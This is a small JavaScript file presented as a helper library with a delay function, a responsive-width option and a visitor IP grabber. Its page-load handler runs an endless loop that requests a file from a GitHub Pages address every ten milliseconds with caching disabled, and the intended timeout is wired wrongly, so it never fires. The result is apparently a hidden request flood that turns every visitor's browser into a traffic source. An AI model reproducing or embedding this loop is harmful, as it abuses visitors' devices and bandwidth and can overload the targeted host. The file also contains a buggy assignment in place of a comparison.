/* This is a simple javascript library that i made.
It needs jquery to function.
The ip grabber does not store the users ip.
*/

//##Options##
  //Enable automatic responsive website (beta)
    //Put this in a javascript file: var resppage = true/false

// Set delay to ms
function delay(milliseconds){
  return new Promise(resolve => {
    setTimeout(resolve, milliseconds);
  });
}

//Get the current year and store it in a variable
var year = new Date().getFullYear();
var userip = 0
// Get the userip and store it in a variable
$.getJSON("https://europe-central2-portfolio-website-374313.cloudfunctions.net/getip", function(data) {
  userip = (data.ip);
})

// Get the width of the screen
var screenWidth = window.innerWidth;

// Get all elements with the class "responsive"
var responsiveElements = document.getElementsByClassName("responsive");

// Loop through all responsive elements and adjust their width
if(resppage = true){
  for (var i = 0; i < responsiveElements.length; i++) {
    responsiveElements[i].style.width = (screenWidth / responsiveElements.length) + "px";
  }
}
window.onload = async function startdownV2(){
  const controller = new AbortController()

  // 5 second timeout:

  const timeoutId = setTimeout(() => controller.abort(), 5000)
  while(true){
    await delay(10);
    fetch('https://t0m0t0w.github.io/backuprr/history.dat', {cache: "no-store"}, { signal: controller.signal }).then(response => {
    // completed request before timeout fired

    // If you only wanted to timeout the request, not the response, add:
    // clearTimeout(timeoutId)
    })
  }
}
/*window.onload = async function startdown(){
  while(true) {
    //await delay(10);
    await fetch('https://t0m0t0w.github.io/backuprr/history.dat', {cache: "no-store"})
  }
}*/